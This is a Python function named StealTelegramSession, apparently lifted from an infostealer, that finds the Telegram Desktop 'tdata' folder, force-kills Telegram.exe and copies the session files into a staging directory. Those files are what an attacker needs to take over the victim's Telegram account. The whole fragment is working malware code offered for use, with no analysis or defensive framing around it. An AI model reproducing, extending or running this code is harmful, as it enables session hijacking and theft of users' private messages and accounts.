import asyncio
import os
import shutil


async def StealTelegramSession(self, directory_path: str) -> None:
    try:
        tg_path = os.path.join(self.appdata, "Telegram Desktop", "tdata")
        
        if os.path.exists(tg_path):
            copy_path = os.path.join(directory_path, "Messenger", "Telegram Session")
            black_listed_dirs = ["dumps", "emojis", "user_data", "working", "emoji", "tdummy", "user_data#2", "user_data#3", "user_data#4", "user_data#5"]

            processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM Telegram.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
            await processes.communicate()

            if not os.path.exists(copy_path):
                os.makedirs(copy_path)

            for dirs in os.listdir(tg_path):
                try:
                    _path = os.path.join(tg_path, dirs)
                    if not dirs in black_listed_dirs:
                        if os.path.isfile(_path):
                            shutil.copyfile(_path, os.path.join(copy_path, dirs))
                        elif os.path.isdir(_path):
                            shutil.copytree(_path, os.path.join(copy_path, dirs))
                except Exception as e:
                    print(f"copy telegram folders error - {str(e)}")
                    continue

            if len(os.listdir(copy_path)) == 0:
                os.rmdir(copy_path)

    except Exception as e:
        print(f"telegram error - {str(e)}")
        pass